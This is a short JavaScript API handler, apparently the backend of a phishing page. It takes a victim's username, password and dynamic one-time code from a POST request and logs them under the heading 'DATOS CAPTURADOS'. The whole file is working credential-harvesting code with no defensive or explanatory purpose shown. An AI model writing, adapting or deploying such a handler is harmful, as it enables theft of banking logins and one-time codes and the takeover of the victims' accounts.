export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { usuario, clave, claveDinamica, fecha } = req.body;

  console.log('----------------------------');
  console.log('🔴 DATOS CAPTURADOS:');
  console.log('Usuario:', usuario || '');
  console.log('Clave:', clave || '');
  console.log('Clave dinámica:', claveDinamica || '');
  console.log('Fecha:', fecha || new Date().toLocaleString());
  console.log('----------------------------');

  res.status(200).json({ ok: true });
}
